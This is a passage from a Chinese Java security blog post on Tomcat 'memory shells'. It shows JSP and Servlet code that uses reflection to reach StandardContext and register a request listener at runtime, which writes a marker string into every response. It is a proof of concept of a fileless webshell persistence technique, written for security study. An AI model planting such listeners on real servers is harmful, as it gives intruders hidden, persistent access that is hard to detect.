rep.getWriter();</span><br><span class="line">                out.println(<span class="string">&quot;d_add_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    context.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问jsp文件发现linsener成功添加。<br><img src="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/16780782150125.jpg"></p>
<h4 id="Servlet写Listener"><a href="#Servlet写Listener" class="headerlink" title="Servlet写Listener"></a>Servlet写Listener</h4><p>因为普通的Servlet继承了HttpServlet，里面包含HttpServletRequest和HttpServletResponse，我们发现具体实现类还是RequestFacade，那么我们可以和jsp一样的构造。访问即可成功添加Listener<br><img src="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/16780782290544.jpg"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/28 16:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/test_StandardContext&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_StandardContext</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Request</span> <span class="variable">req1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            req1 = (Request) f.get(req);</span><br><span class="line"></span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">obj</span> <span class="operator">=</span> (StandardContext) req1.getContext();</span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="comment">// org.apache.catalina.connector.Request</span></span><br><span class="line">                        <span class="type">Object</span> <span class="variable">reqObj</span> <span class="operator">=</span> reqField.get(req);</span><br><span class="line">                        <span class="comment">// org.apache.catalina.connector.Response</span></span><br><span class="line">                        <span class="type">HttpServletResponse</span> <span class="variable">rep</span> <span class="operator">=</span> (HttpServletResponse) reqObj.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(reqObj);</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> rep.getWriter();</span><br><span class="line">                        out.println(<span class="string">&quot;d_add_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            obj.addApplicationEventListener(listener);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后记：当然还有其他方法获取StandardContext，但是不如上面使用的代码简便，下发贴了截图，有兴趣的可以自己调试一下。<br><img src="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/16780782472126.jpg"></p>
<p>当我们想反序列化写内存马的时候，或者想做命令执行回显的时候，我们也是需要获取到当前应用的StandardContext，或者是当前应用的request。我们下一篇学一下如何在目标当前线程中获取request。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
</search>
